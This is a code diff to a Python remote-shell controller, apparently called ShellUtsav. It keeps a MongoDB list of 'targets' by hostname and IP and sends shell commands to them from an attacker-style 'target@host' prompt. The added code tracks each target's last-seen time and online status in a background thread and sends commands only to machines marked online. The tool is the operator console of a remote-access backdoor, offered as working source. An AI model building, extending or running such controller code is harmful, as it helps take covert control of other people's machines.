@@ -7,6 +7,10 @@ from colorama import Fore,init,Style
 import os
 import socket
 import gridfs
+import datetime
+import time
+from threading import Thread
+from datetime import date
 
 MY_FAV_ROOT=f'C:\\Users\\{os.getlogin()}\Desktop'
 MY_FAV_FOLDER='ShellUtsav'
@@ -32,6 +36,9 @@ PUBLIC_IP=""
 PREV_COMMAND=""
 SHELL_RESULT=False
 FILENAME=""
+LAST_SEEN=""
+STATUS=""
+STOP=False
 
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
@@ -73,27 +80,76 @@ def targetInfo():
     else:
         print(Fore.CYAN+">>> ")
         print("No Public IP Found!!!")
-        
+
+def check_online():
+    global STOP,TARGET,STATUS
+    while True:
+        col=db['systemInfo']
+        res=col.find()
+        times=datetime.datetime.now()
+        minute=times.minute
+        if STOP:
+            break
+        today=date.today()
+        year=today.year
+        month=today.month
+        day=today.day
+        strr=f'{year}-{month}-{day}'
+        for i in res:
+            last_seen=i['last_seen']
+            arry=last_seen.split(" ")
+            new_arry=arry[1].split(":")
+            if(i['hostname']==TARGET):
+                STATUS=i['status']
+            if (int(minute) > int(new_arry[1]) and strr==arry[0]):
+                filters={
+                "hostname":i['hostname']
+                }
+                value={
+                    "$set":{
+                    "status":"Offline"
+                    }
+                }
+                try:
+                    col.update_one(filters,value)
+                except Exception as e:
+                    print(e)
+            else:
+                filters={
+                "hostname":i['hostname']
+                }
+                value={
+                    "$set":{
+                    "status":"Online"
+                    }
+                }
+                try:
+                    col.update_one(filters,value)
+                except Exception as e:
+                    print()
+            time.sleep(2)
+            
+
 def getAllTargets():
-    global TARGET
+    global TARGET,LAST_SEEN
     col=db['systemInfo']
     res=col.find()
     print()
     print(Fore.BLUE+Style.BRIGHT+"\tTARGETS: ")
     print()
-    print(Fore.LIGHTBLUE_EX+Style.BRIGHT+"\t| Hostname |\tIP")
-    print(Fore.BLUE+Style.BRIGHT+"\t-----------------------------")
+    print(Fore.LIGHTBLUE_EX+Style.BRIGHT+"\t| Hostname |\tIP\t | Last_Seen\t | Status")
+    print(Fore.BLUE+Style.BRIGHT+"\t--------------------------------------------------------------------------------------")
     for i in res:
         if i['hostname']==TARGET:
-            print(Fore.MAGENTA+Style.BRIGHT+f"\t| {i['hostname']} |\t{i['ip']}   <-- Current")
-            print(Fore.BLUE+Style.BRIGHT+"\t-----------------------------")
+            print(Fore.MAGENTA+Style.BRIGHT+f"\t| {i['hostname']} |\t{i['ip']}\t | {i['last_seen']}\t | {i['status']}   <-- Current")
+            print(Fore.BLUE+Style.BRIGHT+"\t--------------------------------------------------------------------------------------")
         else:
-            print(Fore.GREEN+Style.BRIGHT+f"\t| {i['hostname']} |\t{i['ip']}")
-            print(Fore.BLUE+Style.BRIGHT+"\t-----------------------------") 
+            print(Fore.GREEN+Style.BRIGHT+f"\t| {i['hostname']} |\t{i['ip']}\t | {i['last_seen']}\t | {i['status']}")
+            print(Fore.BLUE+Style.BRIGHT+"\t--------------------------------------------------------------------------------------") 
     print()
 
 def getTargetMachine(target=""):
-    global TARGET,IP,PUBLIC_IP,CWD,PREV_COMMAND
+    global TARGET,IP,PUBLIC_IP,CWD,PREV_COMMAND,LAST_SEEN,STATUS
     col=db['systemInfo']
     if target=="":
         x=col.find_one()
@@ -101,6 +157,8 @@ def getTargetMachine(target=""):
             TARGET=x['hostname']
             IP=x['ip']
             PUBLIC_IP=x['public_ip']
+            LAST_SEEN=x['last_seen']
+            STATUS=x['status']
             CWD=""
             PREV_COMMAND=""
             return x['hostname'],x['ip']
@@ -591,31 +649,43 @@ def result_for_shell(command):
 def shell():
     global CWD
     global PREV_COMMAND
-    global TARGET,IP
+    global TARGET,IP,STOP,STATUS
     getTargetMachine()
     getAllTargets()
     while True:
-        internet=has_active_internet()
+        
         struct0=(Fore.LIGHTYELLOW_EX+f"~\{CWD}")
         struct00=(Fore.MAGENTA+Style.BRIGHT+f"{IP}")
         struct1=(Fore.CYAN+Style.BRIGHT+f"target@{TARGET} {struct00} {struct0}\n")
         struct2=(Fore.MAGENTA+Style.BRIGHT+"$ ")
         shell_struct=struct1+struct2
         command=str(input(shell_struct))
-        if internet:
-            try:
-                PREV_COMMAND=(command)
-                is_directory_change_command()
-                ActionUploader()
+        
+        try:
+                PREV_COMMAND=(command) 
                 if command in ['exit','e','quit','q']:
                     clearCollection()
+                    STOP=True
                     break
-            except Exception as e:
+                if STATUS=='Online' or command=='targetlist' or command=='shifttarget' or command=='commands':
+                    is_directory_change_command()
+                    ActionUploader()
+                else:
+                    print(Fore.CYAN+">>> ")
+                    print(Fore.CYAN+f"Target is Offline mode")
+
+        except Exception as e:
                 print(e)
-        else:
-            print(">>> ")
-            print("You are Offline!!!...")
+       
+
+def thread():
+    internet=has_active_internet()
+    if internet:
+        Thread(target=shell).start()
+        Thread(target=check_online).start()
+    else:
+        print(">>> ")
+        print("You are Offline!!!...")
 
 
-
-shell()
+thread()
